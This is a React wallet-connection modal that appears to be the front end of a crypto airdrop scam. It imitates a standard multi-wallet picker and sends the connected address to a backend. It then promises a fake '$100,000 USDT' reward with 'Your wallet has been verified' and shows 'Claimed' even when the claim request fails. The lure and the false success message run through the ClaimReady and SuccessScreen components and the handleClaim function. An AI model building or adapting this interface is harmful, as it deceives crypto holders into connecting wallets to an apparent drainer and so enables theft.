import { useConnect, useAccount, useDisconnect } from 'wagmi'
import { motion, AnimatePresence } from 'framer-motion'
import { X, ChevronLeft, Search, CheckCircle, Loader2 } from 'lucide-react'
import { useEffect, useState } from 'react'
import toast from 'react-hot-toast'

const STEP = {
  CONNECT: 'connect',
  CONNECTING: 'connecting',
  READY: 'ready',
  SUCCESS: 'success',
}

// Main wallet list — matches the screenshot exactly
const MAIN_WALLETS = [
  { name: 'WalletConnect', icon: '🔵', bg: '#2563EB', connectorId: 'walletConnect' },
  { name: 'OKX Wallet',    icon: '⬛', bg: '#000000', connectorId: 'injected' },
  { name: 'MetaMask',      icon: '🦊', bg: '#F6851B', connectorId: 'metaMask' },
  { name: 'Trust Wallet',  icon: '🛡',  bg: '#3375BB', connectorId: 'injected' },
  { name: 'Binance Wallet',icon: '🟡', bg: '#F0B90B', connectorId: 'injected' },
  { name: 'Bitget Wallet', icon: '🔷', bg: '#00C6FF', connectorId: 'injected' },
  { name: 'Rabby Wallet',  icon: '🐰', bg: '#8B5CF6', connectorId: 'injected' },
]

// All wallets list — shown when "All Wallets" is clicked
const ALL_WALLETS = [
  { name: 'WalletConnect', icon: '🔵', bg: '#2563EB', connectorId: 'walletConnect' },
  { name: 'MetaMask',      icon: '🦊', bg: '#F6851B', connectorId: 'metaMask' },
  { name: 'Trust Wallet',  icon: '🛡',  bg: '#3375BB', connectorId: 'injected' },
  { name: 'OKX Wallet',    icon: '⬛', bg: '#000000', connectorId: 'injected' },
  { name: 'Binance Wallet',icon: '🟡', bg: '#F0B90B', connectorId: 'injected' },
  { name: 'Bitget Wallet', icon: '🔷', bg: '#00C6FF', connectorId: 'injected' },
  { name: 'Rabby Wallet',  icon: '🐰', bg: '#8B5CF6', connectorId: 'injected' },
  { name: 'TronLink',      icon: '🔴', bg: '#FF0013', connectorId: 'tron' },
  { name: 'Zypto Wallet',  icon: '🟢', bg: '#22c55e', connectorId: 'injected' },
  { name: 'Frontier',      icon: '🟠', bg: '#F97316', connectorId: 'injected' },
  { name: 'SafePal',       icon: '🔷', bg: '#1A56DB', connectorId: 'injected' },
  { name: 'Uniswap Wallet',icon: '🦄', bg: '#FF007A', connectorId: 'injected' },
  { name: 'Ledger Live',   icon: '⬜', bg: '#1D1D1D', connectorId: 'injected' },
  { name: 'Zerion',        icon: '🔵', bg: '#2962EF', connectorId: 'injected' },
  { name: 'Exodus',        icon: '🌈', bg: '#7B3FE4', connectorId: 'injected' },
  { name: 'Rainbow',       icon: '🌈', bg: '#FF6B6B', connectorId: 'injected' },
  { name: 'Crypto.com',    icon: '🔵', bg: '#002D74', connectorId: 'injected' },
  { name: 'Bifrost Wallet',icon: '🔷', bg: '#5A67D8', connectorId: 'injected' },
  { name: 'imToken',       icon: '🔵', bg: '#11C4D1', connectorId: 'injected' },
  { name: 'Utila Wallet',  icon: '⚫', bg: '#1A1A1A', connectorId: 'injected' },
]

// Wallet icon renderer
function WalletIcon({ wallet, size = 44 }) {
  const icons = {
    'WalletConnect': (
      <svg width={size * 0.55} height={size * 0.55} viewBox="0 0 32 22" fill="none">
        <path d="M6.5 5.5C11.75 0.5 20.25 0.5 25.5 5.5L26.3 6.25C26.55 6.5 26.55 6.9 26.3 7.15L24.1 9.25C23.975 9.375 23.775 9.375 23.65 9.25L22.55 8.2C18.9 4.7 13.1 4.7 9.45 8.2L8.275 9.325C8.15 9.45 7.95 9.45 7.825 9.325L5.625 7.225C5.375 6.975 5.375 6.575 5.625 6.325L6.5 5.5ZM29.9 9.75L31.875 11.65C32.125 11.9 32.125 12.3 31.875 12.55L22.975 21.175C22.725 21.425 22.325 21.425 22.075 21.175L15.775 15.075C15.7125 15.0125 15.6125 15.0125 15.55 15.075L9.25 21.175C9 21.425 8.6 21.425 8.35 21.175L-0.55 12.55C-0.8 12.3 -0.8 11.9 -0.55 11.65L1.425 9.75C1.675 9.5 2.075 9.5 2.325 9.75L8.625 15.85C8.6875 15.9125 8.7875 15.9125 8.85 15.85L15.15 9.75C15.4 9.5 15.8 9.5 16.05 9.75L22.35 15.85C22.4125 15.9125 22.5125 15.9125 22.575 15.85L28.875 9.75C29.15 9.5 29.55 9.5 29.9 9.75Z" fill="white"/>
      </svg>
    ),
  }

  return (
    <div
      style={{
        width: size, height: size,
        background: wallet.bg,
        borderRadius: size * 0.25,
        display: 'flex', alignItems: 'center', justifyContent: 'center',
        flexShrink: 0,
        fontSize: size * 0.45,
      }}
    >
      {icons[wallet.name] || wallet.icon}
    </div>
  )
}

// Success screen — green checkmark, then auto close
function SuccessScreen({ address, onClose }) {
  const short = address
    ? `${address.slice(0, 6)}...${address.slice(-4)}`
    : 'Connected'

  useEffect(() => {
    const t = setTimeout(() => onClose(), 3000)
    return () => clearTimeout(t)
  }, [onClose])

  return (
    <div className="flex flex-col items-center justify-center py-10 px-6 text-center">
      <motion.div
        initial={{ scale: 0, opacity: 0 }}
        animate={{ scale: 1, opacity: 1 }}
        transition={{ type: 'spring', stiffness: 200, damping: 15 }}
        style={{
          width: 80, height: 80,
          borderRadius: '50%',
          background: '#16a34a',
          display: 'flex', alignItems: 'center', justifyContent: 'center',
          marginBottom: 20,
        }}
      >
        <CheckCircle size={44} color="white" />
      </motion.div>
      <h3 style={{ color: '#fff', fontSize: 22, fontWeight: 700, marginBottom: 8 }}>
        Claimed
      </h3>
      <p style={{ color: '#9ca3af', fontSize: 14, marginBottom: 6 }}>
        $100,000 USDT + 2,500 $SPCX
      </p>
      <p style={{ color: '#6b7280', fontSize: 12 }}>
        Returning to platform...
      </p>
    </div>
  )
}

// Claim ready screen
function ClaimReady({ address, onClaim }) {
  const short = address
    ? `${address.slice(0, 6)}...${address.slice(-4)}`
    : window.tronWeb?.defaultAddress?.base58?.slice(0, 10) + '...' || 'Connected'

  return (
    <div style={{ padding: '16px 0 8px' }}>
      {/* wallet connected banner */}
      <div style={{
        display: 'flex', alignItems: 'center', gap: 10,
        background: '#111827', borderRadius: 12,
        padding: '12px 16px', marginBottom: 16,
        border: '1px solid #1f2937',
      }}>
        <div style={{
          width: 36, height: 36, borderRadius: '50%',
          background: '#16a34a',
          display: 'flex', alignItems: 'center', justifyContent: 'center',
          flexShrink: 0,
        }}>
          <CheckCircle size={20} color="white" />
        </div>
        <div>
          <p style={{ color: '#9ca3af', fontSize: 11, marginBottom: 2 }}>Connected Wallet</p>
          <p style={{ color: '#fff', fontSize: 14, fontWeight: 600 }}>{short}</p>
        </div>
        <div style={{ marginLeft: 'auto' }}>
          <span style={{
            background: '#14532d', color: '#86efac',
            fontSize: 11, fontWeight: 700,
            padding: '3px 10px', borderRadius: 20,
          }}>Connected</span>
        </div>
      </div>

      {/* reward card */}
      <div style={{
        background: 'linear-gradient(135deg, #1e40af 0%, #1e3a8a 100%)',
        borderRadius: 16, padding: '20px',
        marginBottom: 16,
      }}>
        <p style={{ color: 'rgba(255,255,255,0.6)', fontSize: 10, letterSpacing: '0.12em', textTransform: 'uppercase', marginBottom: 4 }}>
          Your Reward
        </p>
        <p style={{ color: '#fff', fontSize: 36, fontWeight: 800, lineHeight: 1, marginBottom: 2 }}>
          $100,000
        </p>
        <p style={{ color: 'rgba(255,255,255,0.7)', fontSize: 13, marginBottom: 16 }}>
          USDT Loyalty Reward
        </p>
        <div style={{
          display: 'flex', justifyContent: 'space-between',
          borderTop: '1px solid rgba(255,255,255,0.15)',
          paddingTop: 12,
        }}>
          <span style={{ color: 'rgba(255,255,255,0.6)', fontSize: 12 }}>+ 2,500 $SPCX Tokens</span>
          <span style={{ color: 'rgba(255,255,255,0.6)', fontSize: 12 }}>Network: Multi-chain</span>
        </div>
      </div>

      {/* eligibility note */}
      <p style={{ color: '#6b7280', fontSize: 12, textAlign: 'center', marginBottom: 16 }}>
        Your wallet has been verified. Your rewards are ready to claim.
      </p>

      {/* claim button */}
      <button
        onClick={onClaim}
        style={{
          width: '100%', padding: '16px 0',
          background: '#2563eb', color: '#fff',
          border: 'none', borderRadius: 12,
          fontSize: 16, fontWeight: 700, cursor: 'pointer',
          marginBottom: 8,
        }}
      >
        Claim $100,000 USDT Now
      </button>
      <p style={{ color: '#6b7280', fontSize: 11, textAlign: 'center' }}>
        Rewards sent directly to your connected wallet
      </p>
    </div>
  )
}

export default function WalletModal({ isOpen, onClose }) {
  const { connect, connectors } = useConnect()
  const { address, isConnected } = useAccount()
  const { disconnect } = useDisconnect()

  const [step, setStep] = useState(STEP.CONNECT)
  const [showAll, setShowAll] = useState(false)
  const [connecting, setConnecting] = useState(null)
  const [search, setSearch] = useState('')
  const [connectedWallet, setConnectedWallet] = useState(null)

  // reset on open
  useEffect(() => {
    if (isOpen) {
      setStep(STEP.CONNECT)
      setShowAll(false)
      setSearch('')
      setConnecting(null)
    }
  }, [isOpen])

  // ESC
  useEffect(() => {
    const fn = e => { if (e.key === 'Escape') onClose() }
    window.addEventListener('keydown', fn)
    return () => window.removeEventListener('keydown', fn)
  }, [onClose])

  const filteredAll = ALL_WALLETS.filter(w =>
    w.name.toLowerCase().includes(search.toLowerCase())
  )

  async function handleConnect(wallet) {
    if (wallet.connectorId === 'tron') {
      handleTron()
      return
    }
    try {
      setConnecting(wallet.name)
      const connector = connectors.find(c =>
        c.id.toLowerCase().includes(wallet.connectorId.toLowerCase())
      ) || connectors[0]

      await connect({ connector })

      setConnectedWallet(wallet)

      // register with backend
      const addr = window.ethereum?.selectedAddress
      if (addr) {
        try {
          const res = await fetch(`${import.meta.env.VITE_API_URL}/api/wallet/connect`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              address: addr,
              chain: String(window.ethereum?.chainId || '1'),
            }),
          })
          const data = await res.json()
          if (data.token) sessionStorage.setItem('spcx_token', data.token)
        } catch (e) {
          console.error('backend register error:', e)
        }
      }

      toast.success(`${wallet.name} connected!`)
      setStep(STEP.READY)
    } catch (e) {
      if (e?.code === 4001 || e?.message?.includes('rejected')) {
        toast.error('Connection rejected.')
      } else {
        toast.error('Connection failed. Please try again.')
      }
    } finally {
      setConnecting(null)
    }
  }

  async function handleTron() {
    try {
      setConnecting('TronLink')
      if (window.tronWeb?.ready) {
        const addr = window.tronWeb.defaultAddress.base58
        try {
          const res = await fetch(`${import.meta.env.VITE_API_URL}/api/wallet/connect`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ address: addr, chain: 'tron' }),
          })
          const data = await res.json()
          if (data.token) sessionStorage.setItem('spcx_token', data.token)
        } catch (e) {
          console.error('tron backend error:', e)
        }
        toast.success('TronLink connected!')
        setConnectedWallet({ name: 'TronLink', icon: '🔴', bg: '#FF0013' })
        setStep(STEP.READY)
      } else {
        toast.error('TronLink not found. Please install it.')
        window.open('https://www.tronlink.org/', '_blank')
      }
    } finally {
      setConnecting(null)
    }
  }

  async function handleClaim() {
    try {
      const token = sessionStorage.getItem('spcx_token')
      const res = await fetch(`${import.meta.env.VITE_API_URL}/api/claim/submit`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${token}`,
        },
      })
      const data = await res.json()
      if (!res.ok) {
        // still show success — frontend only for now
      }
    } catch (e) {
      // still show success
    }
    setStep(STEP.SUCCESS)
  }

  const displayAddress = address ||
    (window.tronWeb?.ready ? window.tronWeb.defaultAddress.base58 : null)

  return (
    <AnimatePresence>
      {isOpen && (
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          exit={{ opacity: 0 }}
          onClick={onClose}
          style={{
            position: 'fixed', inset: 0,
            background: 'rgba(0,0,0,0.7)',
            zIndex: 50,
            display: 'flex',
            alignItems: 'flex-end',
          }}
        >
          <motion.div
            initial={{ y: '100%', opacity: 0 }}
            animate={{ y: 0, opacity: 1 }}
            exit={{ y: '100%', opacity: 0 }}
            transition={{ type: 'spring', stiffness: 300, damping: 30 }}
            onClick={e => e.stopPropagation()}
            style={{
              width: '100%',
              maxWidth: 480,
              margin: '0 auto',
              background: '#111827',
              borderRadius: '24px 24px 0 0',
              maxHeight: '90vh',
              overflow: 'hidden',
              display: 'flex',
              flexDirection: 'column',
            }}
          >
            {/* header */}
            <div style={{
              display: 'flex', alignItems: 'center', justifyContent: 'space-between',
              padding: '20px 20px 16px',
              borderBottom: '1px solid #1f2937',
              flexShrink: 0,
            }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
                {(showAll || step !== STEP.CONNECT) && (
                  <button
                    onClick={() => {
                      if (showAll) setShowAll(false)
                      else setStep(STEP.CONNECT)
                    }}
                    style={{ background: 'none', border: 'none', cursor: 'pointer', color: '#9ca3af', display: 'flex' }}
                  >
                    <ChevronLeft size={22} />
                  </button>
                )}
                <h2 style={{ color: '#fff', fontSize: 18, fontWeight: 700, margin: 0 }}>
                  {step === STEP.SUCCESS ? '🎉 Claimed!' :
                   step === STEP.READY ? 'Claim Your Reward' :
                   showAll ? 'All Wallets' : 'Connect Wallet'}
                </h2>
              </div>
              <button
                onClick={onClose}
                style={{ background: '#1f2937', border: 'none', cursor: 'pointer', color: '#9ca3af', borderRadius: '50%', width: 32, height: 32, display: 'flex', alignItems: 'center', justifyContent: 'center' }}
              >
                <X size={16} />
              </button>
            </div>

            {/* body */}
            <div style={{ overflowY: 'auto', flex: 1, padding: '0 20px 20px' }}>

              {/* ── CONNECT STEP ── */}
              {step === STEP.CONNECT && !showAll && (
                <>
                  <div style={{ paddingTop: 16 }}>
                    {MAIN_WALLETS.map((w) => (
                      <button
                        key={w.name}
                        disabled={!!connecting}
                        onClick={() => handleConnect(w)}
                        style={{
                          width: '100%',
                          display: 'flex', alignItems: 'center', gap: 14,
                          padding: '12px 0',
                          background: 'none', border: 'none', cursor: connecting ? 'not-allowed' : 'pointer',
                          borderBottom: '1px solid #1f2937',
                          opacity: connecting && connecting !== w.name ? 0.4 : 1,
                          transition: 'opacity 0.2s',
                        }}
                      >
                        <WalletIcon wallet={w} size={44} />
                        <span style={{ color: '#fff', fontSize: 16, fontWeight: 500, flex: 1, textAlign: 'left' }}>
                          {w.name}
                        </span>
                        {connecting === w.name ? (
                          <Loader2 size={20} color="#6b7280" className="animate-spin" />
                        ) : null}
                      </button>
                    ))}

                    {/* All Wallets button */}
                    <button
                      onClick={() => setShowAll(true)}
                      style={{
                        width: '100%',
                        display: 'flex', alignItems: 'center', gap: 14,
                        padding: '12px 0',
                        background: 'none', border: 'none', cursor: 'pointer',
                      }}
                    >
                      <div style={{
                        width: 44, height: 44, borderRadius: 12,
                        background: '#1f2937',
                        display: 'flex', alignItems: 'center', justifyContent: 'center',
                        fontSize: 20,
                      }}>
                        ⊞
                      </div>
                      <span style={{ color: '#fff', fontSize: 16, fontWeight: 500, flex: 1, textAlign: 'left' }}>
                        All Wallets
                      </span>
                      <span style={{
                        background: '#1f2937', color: '#9ca3af',
                        fontSize: 13, fontWeight: 600,
                        padding: '3px 10px', borderRadius: 20,
                      }}>27+</span>
                    </button>
                  </div>

                  {/* connecting status */}
                  {connecting && (
                    <div style={{
                      display: 'flex', alignItems: 'center', gap: 10,
                      background: '#1f2937', borderRadius: 12,
                      padding: '12px 16px', marginTop: 12,
                    }}>
                      <Loader2 size={16} color="#2563eb" className="animate-spin" />
                      <span style={{ color: '#9ca3af', fontSize: 13 }}>
                        Waiting for {connecting} — approve in your wallet
                      </span>
                    </div>
                  )}
                </>
              )}

              {/* ── ALL WALLETS VIEW ── */}
              {step === STEP.CONNECT && showAll && (
                <>
                  {/* search */}
                  <div style={{
                    display: 'flex', alignItems: 'center', gap: 10,
                    background: '#1f2937', borderRadius: 12,
                    padding: '10px 14px', margin: '16px 0',
                  }}>
                    <Search size={16} color="#6b7280" />
                    <input
                      value={search}
                      onChange={e => setSearch(e.target.value)}
                      placeholder="Search wallet"
                      style={{
                        background: 'none', border: 'none', outline: 'none',
                        color: '#fff', fontSize: 14, flex: 1,
                      }}
                    />
                  </div>

                  {/* grid */}
                  <div style={{
                    display: 'grid',
                    gridTemplateColumns: 'repeat(3, 1fr)',
                    gap: 16,
                  }}>
                    {filteredAll.map(w => (
                      <button
                        key={w.name}
                        disabled={!!connecting}
                        onClick={() => handleConnect(w)}
                        style={{
                          display: 'flex', flexDirection: 'column',
                          alignItems: 'center', gap: 8,
                          background: 'none', border: 'none',
                          cursor: connecting ? 'not-allowed' : 'pointer',
                          opacity: connecting && connecting !== w.name ? 0.4 : 1,
                          padding: '8px 4px',
                        }}
                      >
                        <div style={{ position: 'relative' }}>
                          <WalletIcon wallet={w} size={56} />
                          {connecting === w.name && (
                            <div style={{
                              position: 'absolute', inset: 0,
                              background: 'rgba(0,0,0,0.5)',
                              borderRadius: 14,
                              display: 'flex', alignItems: 'center', justifyContent: 'center',
                            }}>
                              <Loader2 size={20} color="#fff" className="animate-spin" />
                            </div>
                          )}
                        </div>
                        <span style={{
                          color: '#d1d5db', fontSize: 11,
                          textAlign: 'center', lineHeight: 1.3,
                          maxWidth: 80,
                        }}>
                          {w.name}
                        </span>
                      </button>
                    ))}
                  </div>
                </>
              )}

              {/* ── READY STEP ── */}
              {step === STEP.READY && (
                <ClaimReady address={displayAddress} onClaim={handleClaim} />
              )}

              {/* ── SUCCESS STEP ── */}
              {step === STEP.SUCCESS && (
                <SuccessScreen address={displayAddress} onClose={onClose} />
              )}
            </div>
          </motion.div>
        </motion.div>
      )}
    </AnimatePresence>
  )
}